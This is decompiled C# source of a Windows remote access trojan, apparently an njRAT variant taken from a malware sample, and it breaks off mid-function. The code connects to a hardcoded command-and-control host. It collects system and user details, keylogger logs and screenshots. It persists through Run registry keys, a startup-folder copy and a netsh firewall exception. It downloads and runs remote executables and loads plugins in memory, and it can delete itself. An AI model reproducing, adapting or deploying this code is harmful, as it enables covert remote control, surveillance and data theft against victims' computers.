// Decompiled with JetBrains decompiler
// Type: j.OK
// Assembly: j, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EF058DEA-F639-4E65-A55B-D93AFD410270
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-93f0d08b71ee7e46d00f76300de83a057b22103be7b981eb80e6631eea85b709.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace j
{
  [StandardModule]
  internal sealed class OK
  {
    public static string VN = "b2Zp";
    public static string VR = "0.7d";
    public static object MT = (object) null;
    public static string EXE = "Data.exe";
    public static string DR = "AppData";
    public static string RG = "94ece9a2df6da90eea9f711689c1c620";
    public static string H = "ofi.dyn.ydns.io";
    public static string P = "5553";
    public static string Y = "|'|'|";
    public static bool BD = Conversions.ToBoolean("False");
    public static bool Idr = Conversions.ToBoolean("True");
    public static bool IsF = Conversions.ToBoolean("True");
    public static bool Isu = Conversions.ToBoolean("True");
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    public static FileStream FS;
    public static Computer F = new Computer();
    public static kl kq = (kl) null;
    public static bool Cn = false;
    public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public static TcpClient C = (TcpClient) null;
    private static MemoryStream MeM = new MemoryStream();
    private static byte[] b = new byte[5121];
    private static string lastcap = "";
    public static object PLG = (object) null;

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    public static void DLV(string n)
    {
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static object GTV(string n, object ret)
    {
      object obj;
      try
      {
        obj = OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(ret));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = ret;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static string inf()
    {
      string str1 = "ll" + OK.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(OK.GTV("vn", (object) ""), (object) "", false))
        {
          string str3 = str1;
          string s = OK.DEB(ref OK.VN) + "_" + OK.HWD();
          string str4 = OK.ENB(ref s);
          string y = OK.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = Conversions.ToString(OK.GTV("vn", (object) ""));
          string s2 = OK.DEB(ref s1) + "_" + OK.HWD();
          string str6 = OK.ENB(ref s2);
          string y = OK.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        string str7 = str1;
        string s = OK.HWD();
        string str8 = OK.ENB(ref s);
        string y = OK.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str9 = str2 + "??" + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str10 = str9 + "??" + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str11;
      try
      {
        str11 = str10 + OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str11 = str10 + "??-??-??" + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str12 = str11 + "" + OK.Y;
      string str13;
      try
      {
        str13 = str12 + OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str13 = str12 + "??";
        ProjectData.ClearProjectError();
      }
      string str14 = str13 + "SP";
      string str15;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str14 += "0";
        str15 = str14 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str15 = str14 + "0";
        ProjectData.ClearProjectError();
      }
      string str16;
      try
      {
        str16 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str15 + " x86" + OK.Y : str15 + " x64" + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str16 = str15 + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str17 = (!OK.Cam() ? str16 + "No" + OK.Y : str16 + "Yes" + OK.Y) + OK.VR + OK.Y + ".." + OK.Y + OK.ACT() + OK.Y;
      string str18 = "";
      try
      {
        string[] valueNames = OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str19 = valueNames[index];
          if (str19.Length == 32)
            str18 = str18 + str19 + ",";
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str17 + str18;
    }

    public static string ENB(ref string s) => Convert.ToBase64String(OK.SB(ref s));

    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return OK.BS(ref B);
    }

    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }

    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          int wDriver = (int) checked ((short) num);
          string str1 = Strings.Space(100);
          ref string local1 = ref str1;
          string str2 = (string) null;
          ref string local2 = ref str2;
          if (OK.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
        {
          str1 = "";
        }
        else
        {
          string str2 = Strings.Space(checked (OK.GetWindowTextLength((long) foregroundWindow) + 1));
          OK.GetWindowText(foregroundWindow, ref str2, str2.Length);
          str1 = OK.ENB(ref str2);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static string HWD()
    {
      string str1;
      try
      {
        string str2 = Interaction.Environ("SystemDrive") + "\\";
        ref string local1 = ref str2;
        string str3 = (string) null;
        ref string local2 = ref str3;
        int Number;
        ref int local3 = ref Number;
        int num1 = 0;
        ref int local4 = ref num1;
        int num2 = 0;
        ref int local5 = ref num2;
        string str4 = (string) null;
        ref string local6 = ref str4;
        OK.GetVolumeInformation(ref local1, ref local2, 0, ref local3, ref local4, ref local5, ref local6, 0);
        str1 = Conversion.Hex(Number);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "ERR";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static void ED() => OK.pr(0);

    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    public static void UNS()
    {
      OK.pr(0);
      OK.Isu = false;
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (OK.FS != null)
        {
          OK.FS.Dispose();
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    public static void INS()
    {
      Thread.Sleep(1000);
      if (OK.Idr)
      {
        if (!OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
        {
          try
          {
            if (System.IO.File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
              System.IO.File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
            FileStream fileStream = new FileStream(Interaction.Environ(OK.DR) + "\\" + OK.EXE, FileMode.CreateNew);
            byte[] array = System.IO.File.ReadAllBytes(OK.LO.FullName);
            fileStream.Write(array, 0, array.Length);
            fileStream.Flush();
            fileStream.Close();
            OK.LO = new FileInfo(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
            Process.Start(OK.LO.FullName);
            ProjectData.EndApp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.EndApp();
            ProjectData.ClearProjectError();
          }
        }
      }
      try
      {
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall add allowedprogram \"" + OK.LO.FullName + "\" \"" + OK.LO.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (OK.Isu)
      {
        try
        {
          OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!OK.IsF)
        return;
      try
      {
        System.IO.File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", true);
        OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", FileMode.Open);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(OK.BS(ref b), OK.Y);
      try
      {
        string Left1 = strArray1[0];
        if (Operators.CompareString(Left1, "ll", false) == 0)
          OK.Cn = false;
        else if (Operators.CompareString(Left1, "kl", false) == 0)
          OK.Send("kl" + OK.Y + OK.ENB(ref OK.kq.Logs));
        else if (Operators.CompareString(Left1, "prof", false) == 0)
        {
          string Left2 = strArray1[1];
          if (Operators.CompareString(Left2, "~", false) == 0)
            OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
          else if (Operators.CompareString(Left2, "!", false) == 0)
          {
            OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            OK.Send(Conversions.ToString(Operators.ConcatenateObject((object) ("getvalue" + OK.Y + strArray1[1] + OK.Y), OK.GTV(strArray1[1], (object) ""))));
          }
          else
          {
            if (Operators.CompareString(Left2, "@", false) != 0)
              return;
            OK.DLV(strArray1[2]);
          }
        }
        else if (Operators.CompareString(Left1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = OK.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Execute ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Download ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          OK.Send("bla");
          string str = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str);
            OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(str).Name);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception = ex;
            OK.Send("MSG" + OK.Y + "Execute ERROR " + exception.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "inv", false) == 0)
        {
          byte[] numArray = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & numArray.Length == 0)
          {
            OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y + strArray1[2] + OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = OK.ZIP(memoryStream.ToArray());
              OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(OK.Plugin(numArray, "A"));
            NewLateBinding.LateSet(objectValue, (System.Type) null, "h", new object[1]
            {
              (object) OK.H
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(objectValue, (System.Type) null, "p", new object[1]
            {
              (object) OK.P
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(objectValue, (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(objectValue, (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(Operators.OrObject((object) !OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(objectValue, (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
        else if (Operators.CompareString(Left1, "ret", false) == 0)
        {
          byte[] numArray = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
          if (strArray1[2].Length < 10 & numArray.Length == 0)
          {
            OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[2].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = OK.ZIP(memoryStream.ToArray());
              OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(OK.Plugin(numArray, "A"));
            string[] strArray2 = new string[5]
            {
              "ret",
              OK.Y,
              strArray1[1],
              OK.Y,
              null
            };
            string[] strArray3 = strArray2;
            string s = Conversions.ToString(NewLateBinding.LateGet(objectValue, (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
            string str = OK.ENB(ref s);
            strArray3[4] = str;
            OK.Send(string.Concat(strArray2));
          }
        }
        else if (Operators.CompareString(Left1, "CAP", false) == 0)
        {
          int width = Screen.PrimaryScreen.Bounds.Width;
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          int height = bounds.Height;
          Bitmap bitmap1 = new Bitmap(width, height, PixelFormat.Format16bppRgb555);
          Graphics graphics1 = Graphics.FromImage((Image) bitmap1);
          Graphics graphics2 = graphics1;
          Size size1 = new Size(bitmap1.Width, bitmap1.Height);
          Size blockRegionSize = size1;
          graphics2.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
          try
          {
            Cursor cursor = Cursors.Default;
            Graphics g = graphics1;
            ref Rectangle local = ref bounds;
            Point position = Cursor.Position;
            size1 = new Size(32, 32);
            Size size2 = size1;
            local = new Rectangle(position, size2);
            Rectangle targetRect = bounds;
            cursor.Draw(g, targetRect);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          graphics1.Dispose();
          Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
          Graphics graphics3 = Graphics.FromImage((Image) bitmap2);
          graphics3.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
          graphics3.Dispose();
          MemoryStream memoryStream1 = new MemoryStream();
          string S = "CAP" + OK.Y;
          b = OK.SB(ref S);
          memoryStream1.Write(b, 0, b.Length);
          MemoryStream memoryStream2 = new MemoryStream();
          bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
          string Left3 = OK.md5(memoryStream2.ToArray());
          if (Operators.CompareString(Left3, OK.lastcap, false) != 0)
          {
            OK.lastcap = Left3;
            memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
          }
          else
            memoryStream1.WriteByte((byte) 0);
          OK.Sendb(memoryStream1.ToArray());
          memoryStream1.Dispose();
          memoryStream2.Dispose();
          bitmap1.Dispose();
          bitmap2.Dispose();
        }
        else if (Operators.CompareString(Left1, "un", false) == 0)
        {
          string Left4 = strArray1[1];
          if (Operators.CompareString(Left4, "~", false) == 0)
            OK.UNS();
          else if (Operators.CompareString(Left4, "!", false) == 0)
          {
            OK.pr(0);
            ProjectData.EndApp();
          }
          else
          {
            if (Operators.CompareString(Left4, "@", false) != 0)
              return;
            OK.pr(0);
            Process.Start(OK.LO.FullName);
            ProjectData.EndApp();
          }
        }
        else if (Operators.CompareString(Left1, "up", false) == 0)
        {
          byte[] bytes;
          if (strArray1[1][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = OK.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Update ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[1]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Update ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              return;
            }
          }
          OK.Send("bla");
          string str = Path.GetTempFileName() + ".exe";
          try
          {
            OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(str).Name);
            Thread.Sleep(2000);
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str, "..");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception = ex;
            OK.Send("MSG" + OK.Y + "Update ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            return;
          }
          OK.UNS();
        }
        else if (Operators.CompareString(Left1, "Ex", false) == 0)
        {
          if (OK.PLG == null)
          {
            OK.Send("PLG");
            int num = 0;
            while (!(OK.PLG != null | num == 20 | !OK.Cn))
            {
              checked { ++num; }
              Thread.Sleep(1000);
            }
            if (OK.PLG == null | !OK.Cn)
              return;
          }
          object plg = OK.PLG;
          object[] objArray = new object[1]{ (object) b };
          object[] Arguments = objArray;
          bool[] flagArray = new bool[1]{ true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(plg, (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (!flagArray[0])
            return;
          b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
        }
        else
        {
          if (Operators.CompareString(Left1, "PLG", false) != 0)
            return;
          MemoryStream memoryStream = new MemoryStream();
          int length = (strArray1[0] + OK.Y).Length;
          memoryStream.Write(b, length, checked (b.Length - length));
          OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream.ToArray()), "A"));
          NewLateBinding.LateSet(OK.PLG, (System.Type) null, "H", new object[1]
          {
            (object) OK.H
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(OK.PLG, (System.Type) null, "P", new object[1]
          {
            (object) OK.P
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(OK.PLG, (System.Type) null, "c", new object[1]
          {
            (object) OK.C
          }, (string[]) null, (System.Type[]) null);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception exception = ex1;
        if (strArray1.Length > 0)
        {
          if (Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
            OK.PLG = (object) null;
        }
        try
        {
          OK.Send("ER" + OK.Y + strArray1[0] + OK.Y + exception.Message);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    public static void pr(int i)
    {
      try
      {
        OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static bool Sendb(byte[] b)
    {
      if (!OK.Cn)
        return false;
      try
      {
        lock (OK.LO)
        {
          if (!OK.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = OK.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          OK.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          if (OK.Cn)
          {
            OK.Cn = false;
            OK.C.Close();
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      return OK.Cn;
    }

    public static bool Send(string S) => OK.Sendb(OK.SB(ref S));

    public static bool connect()
    {
      OK.Cn = false;
      Thread.Sleep(2000);
      lock (OK.LO)
      {
        try
        {
          if (OK.C != null)
          {
            try
            {
              OK.C.Close();
              OK.C = (TcpClient) null;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            OK.MeM.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.MeM = new MemoryStream();
          OK.C = new TcpClient();
          OK.C.ReceiveBufferSize = 204800;
          OK.C.SendBufferSize = 204800;
          OK.C.Client.SendTimeout = 10000;
          OK.C.Client.ReceiveTimeout = 10000;
          OK.C.Connect(OK.H, Conversions.ToInteger(OK.P));
          OK.Cn = true;
          OK.Send(OK.inf());
          try
          {
            string str1;
            string str2;
            if (Operators.ConditionalCompareObjectEqual(OK.GTV("vn", (object) ""), (object) "", false))
            {
              str2 = str1 + OK.DEB(ref OK.VN) + "\r\n";
            }
            else
            {
              string str3 = str1;
              string s = Conversions.ToString(OK.GTV("vn", (object) ""));
              string str4 = OK.DEB(ref s);
              str2 = str3 + str4 + "\r\n";
            }
            string s1 = str2 + OK.H + ":" + OK.P + "\r\n" + OK.DR + "\r\n" + OK.EXE + "\r\n" + Conversions.ToString(OK.Idr) + "\r\n" + Conversions.ToString(OK.IsF) + "\r\n" + Conversions.ToString(OK.Isu) + "\r\n" + Conversions.ToString(OK.BD);
            OK.Send("inf" + OK.Y + OK.ENB(ref s1));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          OK.Cn = false;
          ProjectData.ClearProjectError();
        }
      }
      return OK.Cn;
    }

    public static void RC()
    {
      while (true)
      {
        OK.lastcap = "";
        if (OK.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (OK.Cn)
                {
                  if (OK.C.Available < 1)
                    OK.C.Client.Poll(-1, SelectMode.SelectRead);
                  do
                  {
                    if (OK.C.Available != 0)
                    {
